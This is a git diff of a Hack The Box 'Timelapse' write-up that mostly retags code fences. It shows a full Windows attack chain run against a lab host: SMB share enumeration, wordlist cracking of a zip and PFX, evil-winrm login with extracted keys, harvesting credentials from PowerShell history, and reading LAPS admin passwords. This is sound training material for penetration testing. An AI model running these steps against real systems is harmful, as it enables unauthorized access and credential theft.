@@ -7,7 +7,7 @@ Still pretty new to Windows based challenges, so this was a hard but fun one!
 
 ## Port Scanning
 
-```console
+```bash
 $ nmap -A -Pn 10.10.11.152
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 16:48 +04
 Nmap scan report for 10.10.11.152
@@ -42,7 +42,7 @@ One open ports was an SMB port, so I checked for any shares we can access withou
 
 ## SMB Enumeration
 
-```console
+```bash
 $ smbclient -L //10.10.11.152/
 Password for [WORKGROUP\piya]:
 
@@ -61,7 +61,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 `Shares` is one, and it had two directories, `Dev` and `HelpDesk`.
 
-```console
+```bash
 $ smbclient //10.10.11.152/Shares
 Password for [WORKGROUP\piya]:
 Try "help" to get a list of possible commands.
@@ -93,7 +93,7 @@ smb: \HelpDesk\> dir
 
 `winrm_backup.zip` looked interesting, so I downloaded the file and tried to unzip it. What is WinRM? Windows Remote Management, aka SSH for Windows.
 
-```console
+```bash
 smb: \Dev\> get winrm_backup.zip
 getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
 $ unzip winrm_backup.zip
@@ -104,7 +104,7 @@ The zip file requires a password, so I attempted to crack it using `fcrackzip`
 
 ## Crack Passwords
 
-```console
+```bash
 $ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
 
 PASSWORD FOUND!!!!: pw == supremelegacy
@@ -119,7 +119,7 @@ A .pfx file (Personal Information Exchange file), which is in a PKCS#12 format, 
 
 I found a tool called [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) to crack the import password. Not sure why it segfaulted in the end, but it found the password!
 
-```console
+```bash
 $ crackpkcs12 -d rockyou.txt -v legacyy_dev_auth.pfx
 
 Dictionary attack - Starting 8 threads
@@ -133,21 +133,21 @@ Dictionary attack - Thread 3 - Password found: thuglegacy
 
 Then I extracted the public and private keys with the password `thuglegacy`. [^2]
 
-```console
-$ # Export private key
+```bash
+# Export private key
 $ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy-priv.pem -nodes
 Enter Import Password:
 
-$ # Export public key
+# Export public key
 $ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
 Enter Import Password:
 ```
 
-### Foothold + User Flag
+## Foothold + User Flag
 
 I used [evil-winrm](https://github.com/Hackplayers/evil-winrm) with the public and private keys to gain foothold into the system and get the user flag.
 
-```console
+```bash
 $ evil-winrm -i 10.10.11.152 -S -c timelapse-pub.pem -k timelapse-priv.pem -r timelapse
 Evil-WinRM shell v3.3
 
@@ -177,7 +177,7 @@ Mode                LastWriteTime         Length Name
 
 I wasn't sure what to do next from here, so I referred to the official forum discussion for hints. One hint was to check the console history for this user.
 
-```console
+```bash
 *Evil-WinRM* PS C:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 whoami
 ipconfig /all
@@ -193,8 +193,8 @@ exit
 
 A username/password pair! I used this information in evil_winrm to login as `svc_deploy`.
 
-```console
-evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -r timelapse
+```bash
+$ evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -r timelapse
 
 Evil-WinRM shell v3.3
 
@@ -215,7 +215,7 @@ Info: Establishing connection to remote endpoint
 
 Earlier when we accessed the `Shares` share, the `HelpDesk` directory contained documents relating to LAPS. LAPS or Local Administrator Password Solution is a Microsoft product that manages the local administrator password and stores it in Active Directory. It randomizes the password regularly. There is a LAPS Readers that lists users who have the permission to read the password.[^3] So I checked if `svc_deploy` is part of this group.
 
-```console
+```bash
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups
 
 GROUP INFORMATION
@@ -252,7 +252,7 @@ Earlier I did not understand why we logged in as `svc_deploy`, since we were alr
 
 I retrieved the Administrator's password using the following command [^4]
 
-```console
+```bash
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
 
 
@@ -273,7 +273,7 @@ UserPrincipalName           :
 
 Time to log in as Adminstrator!
 
-```console
+```bash
 $ evil-winrm -i 10.10.11.152 -S -u Administrator -p 'Q3/6BK#18e3T)z/Xi[79;9e{' -r timelapse
 
 Evil-WinRM shell v3.3
@@ -297,7 +297,7 @@ Info: Establishing connection to remote endpoint
 No flag? Oh. 
 I tried resetting the machine once, thinking someone may have deleted it, but still no flag. I checked the forum for any hints, and one of the users mentioned to check other users.
 
-```console
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../../
 
 
@@ -315,7 +315,7 @@ d-----        2/23/2022   5:45 PM                TRX
 
 User `TRX` found, flags are generally found in the Desktop directory so I checked there
 
-```console
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../../TRX/
 *Evil-WinRM* PS C:\Users\TRX> dir Desktop
 
